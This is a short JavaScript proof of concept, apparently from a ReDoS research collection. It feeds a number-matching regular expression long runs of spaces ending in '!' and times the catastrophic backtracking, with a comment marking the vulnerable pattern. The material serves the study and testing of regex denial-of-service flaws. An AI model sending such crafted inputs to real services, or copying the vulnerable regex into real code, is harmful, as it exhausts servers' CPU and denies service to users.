/**
 * vuln pattern: POA
 * vuln degree: POL
 * mul vuln: N
 * vuln location: \s*[+-]?\s*
 */
var REGEX = /^\s*[+-]?\s*(?:\d{1,3}(?:(,?)\d{3})?(?:\1\d{3})*(\.\d*)?|\.\d+)\s*$/
for(var i = 1; i <= 5000000; i++) {
    var time = Date.now();
    var attack_str = '' + ' '.repeat(i*10000) + '!'
    REGEX.exec(attack_str);
    var time_cost = Date.now() - time;
    console.log("i.length: " + i + ": " + time_cost+" ms")
}